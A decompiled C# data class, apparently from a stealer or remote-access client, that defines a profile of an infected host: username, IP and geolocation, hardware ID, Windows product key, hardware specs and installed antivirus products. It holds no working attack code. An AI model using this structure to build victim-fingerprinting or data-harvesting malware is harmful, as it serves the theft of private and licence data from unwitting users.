using System;
using System.Collections.Generic;

namespace client.Models
{
	// Token: 0x0200000D RID: 13
	public class InformationStructure
	{
		// Token: 0x17000012 RID: 18
		// (get) Token: 0x0600003A RID: 58 RVA: 0x000025F9 File Offset: 0x000007F9
		// (set) Token: 0x0600003B RID: 59 RVA: 0x00002601 File Offset: 0x00000801
		public string Username { get; set; }

		// Token: 0x17000013 RID: 19
		// (get) Token: 0x0600003C RID: 60 RVA: 0x0000260A File Offset: 0x0000080A
		// (set) Token: 0x0600003D RID: 61 RVA: 0x00002612 File Offset: 0x00000812
		public string Install_Path { get; set; }

		// Token: 0x17000014 RID: 20
		// (get) Token: 0x0600003E RID: 62 RVA: 0x0000261B File Offset: 0x0000081B
		// (set) Token: 0x0600003F RID: 63 RVA: 0x00002623 File Offset: 0x00000823
		public string IP { get; set; }

		// Token: 0x17000015 RID: 21
		// (get) Token: 0x06000040 RID: 64 RVA: 0x0000262C File Offset: 0x0000082C
		// (set) Token: 0x06000041 RID: 65 RVA: 0x00002634 File Offset: 0x00000834
		public string Country { get; set; }

		// Token: 0x17000016 RID: 22
		// (get) Token: 0x06000042 RID: 66 RVA: 0x0000263D File Offset: 0x0000083D
		// (set) Token: 0x06000043 RID: 67 RVA: 0x00002645 File Offset: 0x00000845
		public string Country_Name { get; set; }

		// Token: 0x17000017 RID: 23
		// (get) Token: 0x06000044 RID: 68 RVA: 0x0000264E File Offset: 0x0000084E
		// (set) Token: 0x06000045 RID: 69 RVA: 0x00002656 File Offset: 0x00000856
		public string Region { get; set; }

		// Token: 0x17000018 RID: 24
		// (get) Token: 0x06000046 RID: 70 RVA: 0x0000265F File Offset: 0x0000085F
		// (set) Token: 0x06000047 RID: 71 RVA: 0x00002667 File Offset: 0x00000867
		public string City { get; set; }

		// Token: 0x17000019 RID: 25
		// (get) Token: 0x06000048 RID: 72 RVA: 0x00002670 File Offset: 0x00000870
		// (set) Token: 0x06000049 RID: 73 RVA: 0x00002678 File Offset: 0x00000878
		public string Zip { get; set; }

		// Token: 0x1700001A RID: 26
		// (get) Token: 0x0600004A RID: 74 RVA: 0x00002681 File Offset: 0x00000881
		// (set) Token: 0x0600004B RID: 75 RVA: 0x00002689 File Offset: 0x00000889
		public string Operating_System { get; set; }

		// Token: 0x1700001B RID: 27
		// (get) Token: 0x0600004C RID: 76 RVA: 0x00002692 File Offset: 0x00000892
		// (set) Token: 0x0600004D RID: 77 RVA: 0x0000269A File Offset: 0x0000089A
		public string HWID { get; set; }

		// Token: 0x1700001C RID: 28
		// (get) Token: 0x0600004E RID: 78 RVA: 0x000026A3 File Offset: 0x000008A3
		// (set) Token: 0x0600004F RID: 79 RVA: 0x000026AB File Offset: 0x000008AB
		public List<string> ScreenMetrics { get; set; }

		// Token: 0x1700001D RID: 29
		// (get) Token: 0x06000050 RID: 80 RVA: 0x000026B4 File Offset: 0x000008B4
		// (set) Token: 0x06000051 RID: 81 RVA: 0x000026BC File Offset: 0x000008BC
		public string Windows_Key { get; set; }

		// Token: 0x1700001E RID: 30
		// (get) Token: 0x06000052 RID: 82 RVA: 0x000026C5 File Offset: 0x000008C5
		// (set) Token: 0x06000053 RID: 83 RVA: 0x000026CD File Offset: 0x000008CD
		public string Graphic_Card { get; set; }

		// Token: 0x1700001F RID: 31
		// (get) Token: 0x06000054 RID: 84 RVA: 0x000026D6 File Offset: 0x000008D6
		// (set) Token: 0x06000055 RID: 85 RVA: 0x000026DE File Offset: 0x000008DE
		public string Processor { get; set; }

		// Token: 0x17000020 RID: 32
		// (get) Token: 0x06000056 RID: 86 RVA: 0x000026E7 File Offset: 0x000008E7
		// (set) Token: 0x06000057 RID: 87 RVA: 0x000026EF File Offset: 0x000008EF
		public string Operating_Memory { get; set; }

		// Token: 0x17000021 RID: 33
		// (get) Token: 0x06000058 RID: 88 RVA: 0x000026F8 File Offset: 0x000008F8
		// (set) Token: 0x06000059 RID: 89 RVA: 0x00002700 File Offset: 0x00000900
		public string Antiviruses { get; set; }
	}
}
